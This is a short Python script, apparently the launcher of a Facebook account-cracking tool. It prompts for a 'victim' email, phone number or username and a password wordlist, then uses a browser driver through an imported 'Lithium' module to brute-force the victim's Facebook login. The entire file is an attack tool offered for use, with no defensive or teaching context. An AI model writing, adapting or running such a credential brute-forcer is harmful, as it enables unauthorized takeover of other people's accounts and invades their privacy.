from lithium import Lithium

victim = str(input('Enter the email or phonenumber or username of the victim: '))
print('If the wordlist is already in the same directory, only enter the name like wordlist.txt')
wordlist = str(input('Enter the directory of the wordlist: '))
print("Please wait while system is connecting to the facebook")
Fbcracker = Lithium("chromedriver.exe")
Fbcracker.Details(victim, wordlist)
Fbcracker.Inject()
